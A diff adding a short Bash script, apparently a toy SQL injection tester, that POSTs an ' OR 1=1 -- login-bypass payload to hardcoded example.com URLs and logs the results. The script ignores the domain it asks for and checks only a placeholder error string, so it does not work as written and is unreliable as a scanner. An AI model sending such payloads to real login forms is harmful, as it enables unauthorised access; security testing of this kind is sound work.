@@ -1,0 +1,51 @@
+#!/bin/bash
+# SQL Invader
+# Author: Artemis O. Solomon
+# Version: 1.0
+# This Bash script can be used for legitimate security testing purposes only.
+# It demonstrates how to check for SQL Injection vulnerabilities in a web application.
+# It logs the results to a text file named after the user's input domain.
+
+# Check if curl is installed
+if ! [ -x "$(command -v curl)" ]; then
+  echo "Error: curl is not installed. Please install curl and try again."
+  exit 1
+fi
+
+# Prompt for user input
+read -p "Enter the domain to test for SQL Injection: " domain
+
+# Sanitize the domain input to create a valid file name
+# Replace special characters with underscores
+log_file_name="$(echo "$domain" | tr -c '[:alnum:]' '_').log"
+
+# Create or clear the log file
+> "$log_file_name"
+
+# Function to log messages
+log() {
+  echo "$(date +"%Y-%m-%d %H:%M:%S") - $1" | tee -a "$log_file_name"
+}
+
+log "Testing $domain for SQL Injection vulnerabilities..."
+
+# Create an array of base URLs to test
+url_list=("http://www.example.com" "http://www.example2.com" "http://www.example3.com")
+
+# Iterate through the list of URLs and send malicious input
+for url in "${url_list[@]}"
+do
+  # Try malicious input
+  response=$(curl -X POST "$url" --data "username=admin&password=' OR 1=1 --;")
+
+  # Check the response for signs of SQL Injection vulnerability (replace "<error_message>")
+  if [[ $response == *"<error_message>"* ]]; then
+    log "Potential SQL Injection vulnerability found at $url"
+  else
+    log "No SQL Injection vulnerability detected at $url"
+  fi
+done
+
+log "SQL Injection testing complete."
+
+echo "Results have been logged to $log_file_name"
